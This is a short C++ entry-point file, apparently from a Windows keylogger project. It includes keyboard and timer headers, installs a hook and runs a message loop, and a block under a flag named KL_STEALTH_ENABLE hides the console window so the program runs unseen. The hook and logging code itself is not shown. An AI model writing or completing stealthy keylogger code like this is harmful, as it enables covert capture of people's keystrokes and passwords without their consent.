
#include <iostream>
#include <string>
#include "FileOperations.h"
#include "Timestamp.h"
#include "Misc.h"
#include "KeyPair.h"
#include "Keyboard.h"
#include "Timer.h"

int main()
{
    MSG qmsg; 
#if defined KL_STEALTH_ENABLE   
    HWND myConsole = FindWindowA("ConsoleWindowClass", 0); 
    ShowWindow(myConsole,0); 
#endif
    std::cout << fileOperations::fileOps().getCurrentDirectory() << std::endl;

    installHook();
    tim::tim().start();
    while(GetMessage(&qmsg, (HWND) NULL, 0, 0)) 
    { 
        if(!CallMsgFilter(&qmsg, 0)) 
            DispatchMessage(&qmsg); 
    }
    //tim::tim().stop();
    return 0;
}